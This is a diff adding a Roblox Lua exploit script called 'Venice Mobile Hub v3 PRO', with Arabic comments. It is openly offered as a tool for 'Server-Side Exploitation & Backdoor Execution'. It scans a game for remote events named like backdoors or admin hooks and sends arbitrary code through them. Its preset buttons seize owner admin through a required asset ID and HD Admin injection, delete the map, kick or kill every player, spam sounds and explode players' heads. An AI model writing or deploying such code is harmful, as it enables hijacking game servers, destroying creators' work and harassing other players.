@@ -1,0 +1,169 @@
+-- === Venice Mobile Hub v3 PRO EDITION ===
+-- Optimized for: Server-Side Exploitation & Backdoor Execution
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local TweenService = game:GetService("TweenService")
+local Lighting = game:GetService("Lighting")
+
+-- تجهيز رابط صورة سكنك
+local userId = LocalPlayer.UserId
+local thumbType = Enum.ThumbnailType.HeadShot
+local thumbSize = Enum.ThumbnailSize.Size420x420
+local playerIcon = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
+
+-- === واجهة المستخدم ===
+local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
+ScreenGui.ResetOnSpawn = false
+
+local MainFrame = Instance.new("Frame", ScreenGui)
+MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+MainFrame.Size = UDim2.new(0, 350, 0, 480)
+MainFrame.Position = UDim2.new(0.5, -175, 0.5, -240)
+MainFrame.Visible = false
+MainFrame.Active = true
+MainFrame.Draggable = true
+Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 15)
+
+-- العنوان
+local Title = Instance.new("TextLabel", MainFrame)
+Title.Size = UDim2.new(1, 0, 0, 50)
+Title.Text = "VENICE HUB v3 PRO"
+Title.TextColor3 = Color3.fromRGB(255, 0, 0)
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 20
+Title.BackgroundTransparency = 1
+
+-- الصفحات
+local ScannerPage = Instance.new("ScrollingFrame", MainFrame)
+ScannerPage.Size = UDim2.new(1, -20, 1, -80)
+ScannerPage.Position = UDim2.new(0, 10, 0, 60)
+ScannerPage.BackgroundTransparency = 1
+ScannerPage.ScrollBarThickness = 2
+local Layout = Instance.new("UIListLayout", ScannerPage)
+Layout.Padding = UDim.new(0, 8)
+
+local HackPanel = Instance.new("Frame", MainFrame)
+HackPanel.Size = UDim2.new(1, 0, 1, 0)
+HackPanel.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
+HackPanel.Visible = false
+Instance.new("UICorner", HackPanel).CornerRadius = UDim.new(0, 15)
+
+-- أدوات صفحة التهكير
+local CodeBox = Instance.new("TextBox", HackPanel)
+CodeBox.Size = UDim2.new(1, -20, 0, 100)
+CodeBox.Position = UDim2.new(0, 10, 0, 60)
+CodeBox.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
+CodeBox.TextColor3 = Color3.fromRGB(0, 255, 100)
+CodeBox.MultiLine = true
+CodeBox.Text = ""
+CodeBox.PlaceholderText = "Enter Script or require(ID)..."
+Instance.new("UICorner", CodeBox)
+
+local HackBtn = Instance.new("TextButton", HackPanel)
+HackBtn.Size = UDim2.new(0, 150, 0, 40)
+HackBtn.Position = UDim2.new(0, 10, 0, 170)
+HackBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+HackBtn.Text = "Hacking"
+HackBtn.Font = Enum.Font.GothamBold
+HackBtn.TextColor3 = Color3.white
+Instance.new("UICorner", HackBtn)
+
+local ClearBtn = Instance.new("TextButton", HackPanel)
+ClearBtn.Size = UDim2.new(0, 150, 0, 40)
+ClearBtn.Position = UDim2.new(1, -160, 0, 170)
+ClearBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+ClearBtn.Text = "Clear"
+ClearBtn.TextColor3 = Color3.white
+Instance.new("UICorner", ClearBtn)
+
+-- قائمة الأوامر التدميرية (Quick Actions)
+local QuickActions = Instance.new("ScrollingFrame", HackPanel)
+QuickActions.Size = UDim2.new(1, -20, 0, 240)
+QuickActions.Position = UDim2.new(0, 10, 0, 220)
+QuickActions.BackgroundTransparency = 1
+QuickActions.ScrollBarThickness = 2
+Instance.new("UIListLayout", QuickActions).Padding = UDim.new(0, 5)
+
+-- وظيفة التنفيذ
+local selectedRemote = nil
+function execute(code)
+    if selectedRemote and code ~= "" then
+        if selectedRemote:IsA("RemoteEvent") then
+            selectedRemote:FireServer(code)
+        elseif selectedRemote:IsA("RemoteFunction") then
+            selectedRemote:InvokeServer(code)
+        end
+    end
+end
+
+-- وظيفة إضافة الأزرار التدميرية
+function addCommand(name, script)
+    local btn = Instance.new("TextButton", QuickActions)
+    btn.Size = UDim2.new(1, 0, 0, 35)
+    btn.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+    btn.Text = name
+    btn.TextColor3 = Color3.white
+    Instance.new("UICorner", btn)
+    btn.MouseButton1Click:Connect(function() execute(script) end)
+end
+
+-- === إضافة الأوامر (الجلد الحقيقي) ===
+addCommand("⭐ GET OWNER ADMIN", [[
+    local name = "]]..LocalPlayer.Name..[["
+    require(110047253067635):Hload(name)
+    -- Try HD Admin injection
+    local hd = workspace:FindFirstChild("HDAdminSetup") or game:GetService("ReplicatedStorage"):FindFirstChild("HDAdminSetup")
+    if hd then require(hd.Main.Loader)(game.Players[name], "Owner") end
+]])
+
+addCommand("🖼️ MY FACE EVERYWHERE (Skybox)", [[
+    local l = game:GetService("Lighting")
+    for _, v in pairs(l:GetChildren()) do if v:IsA("Sky") then v:Destroy() end end
+    local s = Instance.new("Sky", l)
+    local img = "]]..playerIcon..[["
+    s.SkyboxBk, s.SkyboxDn, s.SkyboxFt, s.SkyboxLf, s.SkyboxRt, s.SkyboxUp = img, img, img, img, img, img
+]])
+
+addCommand("☢️ NUKE MAP (Delete All)", "for _,v in pairs(workspace:GetChildren()) do if not v:IsA('Terrain') and not game.Players:GetPlayerFromCharacter(v) then v:Destroy() end end")
+addCommand("📢 EAR-RAPE (Sound Spam)", "for _,v in pairs(game:GetDescendants()) do if v:IsA('Sound') then v.Volume = 10 v:Play() v.Looped = true end end")
+addCommand("🚫 MASS KICK ALL", "for _,v in pairs(game.Players:GetPlayers()) do if v ~= game.Players.LocalPlayer then v:Kick('Venice Hub Was Here.') end end")
+addCommand("🛸 ZERO GRAVITY", "workspace.Gravity = 0")
+addCommand("💀 KILL ALL", "for _,v in pairs(game.Players:GetPlayers()) do v.Character:BreakJoints() end")
+addCommand("🏃 SPEED FOR ALL", "for _,v in pairs(game.Players:GetPlayers()) do v.Character.Humanoid.WalkSpeed = 100 end")
+addCommand("🌑 ETERNAL DARKNESS", "game.Lighting.TimeOfDay = '00:00:00' game.Lighting.FogEnd = 0")
+addCommand("🔥 INFECT EVERYONE", "for _,v in pairs(game.Players:GetPlayers()) do local s = Instance.new('Explosion', v.Character.Head) end")
+
+-- أزرار التحكم بالواجهة
+HackBtn.MouseButton1Click:Connect(function() execute(CodeBox.Text) end)
+ClearBtn.MouseButton1Click:Connect(function() CodeBox.Text = "" end)
+
+-- نظام البحث
+for _, v in pairs(game:GetDescendants()) do
+    if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
+        if v.Name:lower():find("backdoor") or v.Name:lower():find("admin") or v.Name:lower():find("remote") then
+            local b = Instance.new("TextButton", ScannerPage)
+            b.Size = UDim2.new(1, 0, 0, 40)
+            b.Text = "Target Found: " .. v.Name
+            b.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
+            b.TextColor3 = Color3.white
+            Instance.new("UICorner", b)
+            b.MouseButton1Click:Connect(function()
+                selectedRemote = v
+                ScannerPage.Visible = false
+                HackPanel.Visible = true
+                Title.Text = "CONTROLLING: " .. v.Name
+            end)
+        end
+    end
+end
+
+-- زر الفتح والإغلاق
+local Toggle = Instance.new("TextButton", ScreenGui)
+Toggle.Size = UDim2.new(0, 65, 0, 65)
+Toggle.Position = UDim2.new(0, 10, 0.4, 0)
+Toggle.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+Toggle.Text = "VENICE"
+Toggle.TextColor3 = Color3.white
+Instance.new("UICorner", Toggle).CornerRadius = UDim.new(1, 0)
+Toggle.MouseButton1Click:Connect(function() MainFrame.Visible = not MainFrame.Visible end)
